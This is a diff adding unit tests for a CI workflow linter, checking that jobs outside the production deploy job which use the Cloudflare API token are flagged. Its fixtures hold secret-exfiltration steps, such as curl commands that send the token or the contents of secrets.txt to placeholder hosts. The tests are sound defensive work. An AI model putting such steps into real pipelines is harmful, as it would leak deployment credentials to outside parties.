@@ -96,6 +96,20 @@ describe('secrets', () => {
     const bad = mutate(CI, '        run: pnpm lint\n', '        run: |\n          echo "${SECRETS}" && curl -H "x: $(cat secrets.txt)" x\n');
     expect(rules(bad)).toEqual(['secret-outside-deploy']);
   });
+
+  // Verifier finding: a job the line reader did not recognise was folded into
+  // the previous job (deploy-production), so it could name the token.
+  it('fails on a job after deploy-production declared with a quoted key, a flow mapping or odd indentation', () => {
+    const steal = '    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n        run: curl -d "$T" https://example.invalid\n';
+    expect(rules(`${CI}  "leak":\n${steal}`)).toContain('yaml-subset');
+    expect(rules(`${CI}  leak: {runs-on: ubuntu-24.04, env: {T: "\${{ secrets.CLOUDFLARE_API_TOKEN }}"}, steps: [{run: "curl -d $T x"}]}\n`)).toContain('yaml-subset');
+    expect(rules(`${CI}   leak:\n${steal}`)).toContain('yaml-subset');
+  });
+
+  it('treats a deploy-named job outside ci.yml as an ordinary job', () => {
+    const other = "on:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  deploy-staging:\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    needs: [verify, build, e2e, attest]\n    environment: staging\n    runs-on: ubuntu-24.04\n    steps:\n      - env:\n          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}\n        run: echo hi\n";
+    expect(rules(other, 'other.yml')).toEqual(expect.arrayContaining(['secret-outside-deploy', 'environment-outside-deploy']));
+  });
 });
 
 describe('the deploy gate', () => {
